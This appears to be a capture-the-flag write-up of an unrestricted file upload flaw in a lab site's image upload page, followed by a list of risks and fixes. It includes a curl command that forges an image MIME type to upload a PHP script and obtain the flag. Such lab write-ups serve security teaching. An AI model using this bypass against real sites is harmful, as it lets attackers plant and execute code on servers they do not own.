## Location :
Page upload (add image)

## Type of Vulnerability :
Unrestriced file upload

## Explanation
It is possible to send a php file to execute a script, forcing the MIME type with a curl command so that the site thinks it's an image
``curl -X POST 'http://192.168.31.217/?page=upload' -F 'uploaded=@/home/jbertin/Desktop/test.php;type=image/jpeg' -F 'Upload=Upload'``
-> We get the flag

## Risks
- Upload of malicious code
- Execution of malicious code
- Opening to certain types of DoS (Denial of Service) attacks
- Privilege escalation

## How to Fix
- Backend validation, particularly on the actual MIME type.
- Whitelist of authorized file extensions
- Placement of uploaded files in a directory not accessible from the internet
- Automatic renaming of files at the time of their registration (to avoid any conflict and unwanted replacement)
- Limit the size of files
